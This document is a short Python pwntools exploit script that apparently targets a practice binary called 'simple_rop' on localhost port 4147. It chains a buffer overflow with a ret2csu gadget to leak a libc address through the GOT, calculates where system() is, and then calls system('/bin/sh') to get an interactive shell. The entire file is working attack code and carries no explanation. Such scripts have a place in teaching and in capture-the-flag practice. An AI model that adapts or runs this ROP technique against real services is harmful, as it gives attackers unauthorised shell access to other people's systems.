from pwn import *
import sys

def exploit():
	p1 =  cyclic(24)
	p1 += p64(init2)
	p1 += csu_init(elf.got['write'], 1, elf.got['read'], 8, init1)
	p1 += p64(0)*7
	p1 += p64(main)

	print p.recvuntil("?")
	p.sendline(p1)
	read_addr = u64(p.recv(8))
	libc_base = read_addr - l.symbols['read']
	system = libc_base + l.symbols['system']

	p2 = cyclic(24)
	p2 += p64(pr)
	binsh = libc_base + l.search("/bin/sh").next()
	p2 += p64(binsh)
	p2 += p64(system)

	p.recvuntil("?")
	p.sendline(p2)
	p.interactive()

def csu_init(func, arg1, arg2, arg3, returns):
	payload =  'A' * 8
	payload += p64(0) # rbx
	payload += p64(1) # rbp
	payload += p64(func) # r12
	payload += p64(arg1) # r13
	payload += p64(arg2) # r14
	payload += p64(arg3) # r15
	payload += p64(returns) # rip
	return payload

def main():
	global b, l, elf, p, shellcode, init1, init2, main, pr

	# context.log_level = 'debug'
	context.arch = 'amd64'

	b   = './simple_rop'
	elf = ELF(b)
	l = elf.libc
	#p   = process(b)
	# p = process(b, env={'LD_PRELOAD' : l})
	p = remote('localhost', 4147)

	init1 = 0x4005c0 
	init2 = 0x4005da
	main = 0x400537
	pr = 0x4005e3

	exploit()

if __name__ == '__main__':
	main()
